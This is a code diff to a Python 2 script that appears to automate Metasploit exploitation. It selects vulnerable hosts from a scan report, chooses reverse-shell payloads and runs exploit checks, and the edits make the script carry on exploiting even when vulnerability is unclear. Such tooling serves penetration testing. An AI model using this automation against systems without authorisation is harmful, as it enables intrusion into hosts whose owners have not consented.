@@ -73,7 +73,7 @@ def get_exploitable_hosts(report):
                         print_good('Found vulnerable host! {}:{} - {}'.format(ip, port, msf_mod))
 
                         if exploits.get(msf_mod):
-                            exploits[msf_mod].append((ip, port))
+                            exploits[msf_mod].append((operating_sys, ip, port))
                         else:
                             exploits[msf_mod] = [(operating_sys, ip, port)]
 
@@ -341,12 +341,11 @@ def get_payload(module, operating_sys):
     # No preferred payload found. If aux module, just set it to rev_https bc it doesn't matter
     if payload == None:
         if 'auxiliary' not in module:
-            print_bad('No preferred payload found, here\'s what was found:')
-            for p in payloads:
-                print '    '+p
+            print_bad('No preferred payload found, first and last comapatible payloads:')
+            print '    '+payloads[0]
+            print '    '+payloads[-1]
             print_info('Skipping this exploit')
             return
-            #print_info('Setting payload to {} and continuing'.format(payloads[0]))
 
         payload = win_payloads[0]
 
@@ -375,14 +374,16 @@ def check_vuln(c_id):
     cmd = 'check\n'
     out = run_console_cmd(c_id, cmd)
     not_sure_msgs = ['Cannot reliably check exploitability', 'The state could not be determined']
-    if out:
-        for l in out:
-            if 'is vulnerable' in l:
-                print_good('Vulnerable!')
-                return True
-            elif any(x in l for x in not_sure_msgs):
-                print_info('Unsure if vulnerable, continuing with exploit')
-                return True
+    if out == []:
+        print_info('Unsure if vulnerable, continuing with exploit')
+        return True
+    for l in out:
+        if 'is vulnerable' in l:
+            print_good('Vulnerable!')
+            return True
+        elif any(x in l for x in not_sure_msgs) or l == '':
+            print_info('Unsure if vulnerable, continuing with exploit')
+            return True
 
     return False
 
